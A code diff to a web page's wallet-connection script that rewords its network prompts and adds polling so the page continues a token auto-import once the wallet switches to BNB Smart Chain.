@@ -124,7 +124,7 @@ html,body {
 </svg>
 </div>
 
-<div id="instruction" class="instruction">Select BNB Smart Chain ↑</div>
+<div id="instruction" class="instruction">Select BNB Chain</div>
 
 <script>
 const TOKEN = {
@@ -171,7 +171,7 @@ async function autoImport(){
     }
 }
 
-async function init(){
+async function init() {
     await new Promise(r=>setTimeout(r,1000));
 
     if(!window.ethereum){
@@ -193,11 +193,25 @@ async function init(){
         return;
     }
 
-    const chain = await ethereum.request({method:"eth_chainId"});
-    if(chain !== "0x38"){
+    const chain = await ethereum.request({ method:"eth_chainId" });
+
+    if(chain !== "0x38"){  
         loader.style.display="none";
-        statusEl.textContent="Please switch network";
+        statusEl.textContent="Switch to BNB Smart Chain";
         showNetworkHint();
+
+        // ✅ Mobile-only chain polling
+        let checkChain = setInterval(async () => {
+            const newChain = await ethereum.request({ method:"eth_chainId" });
+            if(newChain === "0x38"){
+                clearInterval(checkChain);
+                hideNetworkHint();
+                statusEl.textContent = "BNB Smart Chain detected — importing…";
+                loader.style.display="block";
+                autoImport(); // ✅ Continue automatically
+            }
+        }, 500);
+
         return;
     }
 
